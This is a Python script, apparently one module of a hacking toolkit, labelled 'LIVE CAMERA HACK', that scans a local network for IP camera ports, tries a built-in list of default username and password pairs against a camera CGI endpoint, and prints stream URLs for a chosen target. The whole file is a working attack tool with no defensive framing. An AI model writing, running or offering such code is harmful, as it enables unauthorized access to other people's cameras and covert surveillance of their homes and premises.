#!/usr/bin/env python3
# LIVE CAMERA HACK - Scan dan akses IP Camera

import socket
import requests
import threading
from core.colors import Colors

class CameraHack:
    def __init__(self):
        self.name = "Live Camera Hack"
        self.default_ports = [80, 8080, 554, 8000, 8081]
        self.default_creds = [
            ("admin", "admin"), ("admin", ""), ("admin", "12345"),
            ("root", "admin"), ("user", "user"), ("admin", "password")
        ]
        self.found_cams = []
    
    def scan_port(self, ip, port):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.5)
            result = sock.connect_ex((ip, port))
            sock.close()
            return result == 0
        except:
            return False
    
    def try_credentials(self, ip, port):
        for user, passwd in self.default_creds:
            try:
                url = f"http://{ip}:{port}/cgi-bin/hi3510/param.cgi"
                resp = requests.get(url, auth=(user, passwd), timeout=3)
                if resp.status_code == 200:
                    return True, user, passwd
            except:
                pass
        return False, None, None
    
    def scan_network(self, network):
        print(f"{Colors.CYAN}[*] Scanning {network}.0/24{Colors.END}")
        found = []
        
        def scan_ip(ip):
            for port in self.default_ports:
                if self.scan_port(ip, port):
                    print(f"{Colors.GREEN}[+] Found device: {ip}:{port}{Colors.END}")
                    found.append({"ip": ip, "port": port})
        
        threads = []
        for i in range(1, 255):
            ip = f"{network}.{i}"
            t = threading.Thread(target=scan_ip, args=(ip,))
            t.start()
            threads.append(t)
            
            if len(threads) >= 50:
                for t in threads:
                    t.join()
                threads = []
        
        for t in threads:
            t.join()
        
        return found
    
    def run(self):
        print(f"\n{Colors.CYAN}[*] {self.name}{Colors.END}")
        print(f"{Colors.GREEN}[1]{Colors.END} Scan Local Network")
        print(f"{Colors.GREEN}[2]{Colors.END} Test Credentials")
        print(f"{Colors.GREEN}[3]{Colors.END} View Camera Stream")
        
        choice = input(f"\n{Colors.RED}└─{Colors.WHITE}$ {Colors.END}")
        
        if choice == '1':
            network = input(f"{Colors.GREEN}Network (192.168.1) > {Colors.END}") or "192.168.1"
            results = self.scan_network(network)
            print(f"\n{Colors.GREEN}[+] Found {len(results)} devices{Colors.END}")
            for r in results:
                print(f"  {Colors.WHITE}• {r['ip']}:{r['port']}{Colors.END}")
        
        elif choice == '2':
            ip = input(f"{Colors.GREEN}Target IP > {Colors.END}")
            port = int(input(f"{Colors.GREEN}Port > {Colors.END}") or "80")
            success, user, pwd = self.try_credentials(ip, port)
            if success:
                print(f"{Colors.GREEN}[+] Credentials found: {user}:{pwd}{Colors.END}")
            else:
                print(f"{Colors.RED}[!] No default credentials found{Colors.END}")
        
        elif choice == '3':
            ip = input(f"{Colors.GREEN}Camera IP > {Colors.END}")
            port = input(f"{Colors.GREEN}Port (80) > {Colors.END}") or "80"
            print(f"{Colors.CYAN}[*] Stream URL: http://{ip}:{port}/stream{Colors.END}")
            print(f"{Colors.CYAN}[*] Or: http://{ip}:{port}/video.cgi{Colors.END}")

if __name__ == "__main__":
    tool = CameraHack()
    tool.run()
